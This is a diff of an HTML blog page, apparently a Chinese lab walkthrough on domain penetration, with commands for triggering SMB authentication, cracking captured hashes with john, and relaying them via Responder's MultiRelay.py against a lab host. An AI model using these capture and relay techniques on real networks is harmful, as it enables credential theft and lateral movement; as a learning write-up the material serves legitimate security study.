@@ -69,7 +69,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/05/20/dD9AjRs6YIc7oCe.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/20/Xk71S5RWCg98cv6.png">
 <meta property="article:published_time" content="2020-05-19T08:02:47.000Z">
-<meta property="article:modified_time" content="2020-05-20T15:08:05.612Z">
+<meta property="article:modified_time" content="2020-05-20T15:24:10.740Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary">
@@ -350,9 +350,10 @@
 <blockquote>
 <p>参考文章：</p>
 <p><a href="https://xz.aliyun.com/t/3560" target="_blank" rel="noopener">https://xz.aliyun.com/t/3560</a> </p>
-<p><a href="https://www.jianshu.com/p/1b545a8b8b1e" target="_blank" rel="noopener">https://www.jianshu.com/p/1b545a8b8b1e</a> </p>
+<p><a href="https://www.jianshu.com/p/1b545a8b8b1e" target="_blank" rel="noopener">https://www.jianshu.com/p/1b545a8b8b1e</a></p>
+<p> <a href="https://www.anquanke.com/post/id/193493#h2-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193493#h2-10</a> </p>
 </blockquote>
-<p>假如收到了<code>SMB</code>，可以尝试john爆破</p>
+<p>假如收到了<code>SMB</code>请求以及<code>hash</code>，可以尝试john爆破</p>
 <p>…</p>
 <p>为了测试，直接在win2008中使用ipc从而产生<code>SMB</code>请求</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.100\aaa</span><br></pre></td></tr></table></figure>
@@ -361,6 +362,7 @@
 <p>john爆破</p>
 <p><img src="https://i.loli.net/2020/05/20/MynhNDw4z3lq8HX.png" alt="Snipaste_2020-05-20_22-11-45.png"></p>
 <p>如果爆破失败，可以继续中继win2008打win7，</p>
+<p>在<code>Responder.conf</code> 中关闭 <code>smb、http</code> </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MultiRelay.py -t 192.168.93.30 -u ALL</span><br></pre></td></tr></table></figure>
 
 <p>仍然用ipc连接测试，但是这里需要输入ipc连接的账户密码</p>
